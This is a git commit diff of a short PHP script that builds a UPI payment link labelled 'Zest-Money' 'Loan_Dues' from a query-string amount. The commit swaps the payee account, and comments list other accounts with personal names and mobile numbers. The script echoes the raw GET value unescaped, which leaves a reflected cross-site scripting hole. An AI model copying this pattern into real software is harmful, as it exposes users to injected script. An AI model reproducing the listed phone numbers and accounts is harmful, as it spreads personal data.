bac138b320aeb3201c6cd783bf7449bcb80efb2b
Sharmaji95 <59778771+Sharmaji95@users.noreply.github.com>
2023-01-09 23:13:38 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,6 +1,6 @@
 <?php
 $amount=$_GET['am'];
-$link = "upi://pay?pa=rpy.qrvaloremsta13298438@icici&pn=Zest-Money&tn=Loan_Dues&tr=RZPK3TKR1sgdwaLlDqrv2&cu=INR&mode=02&am=";
+$link = "upi://pay?pa=rpy.qrvaloremsta84810627@icici&pn=Zest-Money&tn=Loan_Dues&tr=RZPJySUL1xdj4VRl0qrv2&cu=INR&mode=02&am=";
 $newURL = $link.$amount;
 If($amount){
     echo $newURL;
@@ -13,3 +13,4 @@ If($amount){
 ?>
 
 // billbook8781224@yesbank (2223330091834461@RATN0VAAPIS.ifsc.npci&cu=INR). __(upi://pay?pa=rpy.qrvaloremsta13298438@icici&pn=YOGESH%20&tn=YOGESH%20&tr=RZPK3TKR1sgdwaLlDqrv2&cu=INR&mode=02&mbbnumber=9068062563)
+// rpy.qrvaloremsta84810627@icici&pn=Vinay&tn=Vinay&tr=RZPJySUL1xdj4VRl0qrv2&cu=INR&mode=02&mbbnumber=9050995106
